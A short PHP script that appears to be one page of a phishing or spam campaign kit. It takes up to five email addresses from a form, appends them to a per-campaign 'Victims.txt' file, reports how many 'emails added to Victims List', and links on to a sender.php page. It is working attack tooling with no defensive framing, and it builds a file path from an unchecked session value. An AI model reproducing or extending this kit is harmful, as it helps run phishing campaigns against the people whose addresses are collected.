<?php
session_start();
$c=$_SESSION['campaign'];
$e=array($_POST[email0],$_POST[email1],$_POST[email2],$_POST[email3],$_POST[email4]);

$rec='';
$k=0;
for($i=0;$i<5;$i++)
	{
	$temp=$e[$i];
	if (strpos($temp,"@"))
		{
			$rec=$rec.$temp.',';
			$k++;
		}
	
	}

$f=fopen($c.'/Victims.txt','a');
fwrite($f,$rec);
fclose($f);

?>

<html>

<head>

</head>
<body>
<h1>Victims List</h1><br>
<?php 
echo $k." emails added to Victims List";
?>


</body>
<br><br>
<a href="sender.php">Next</a>
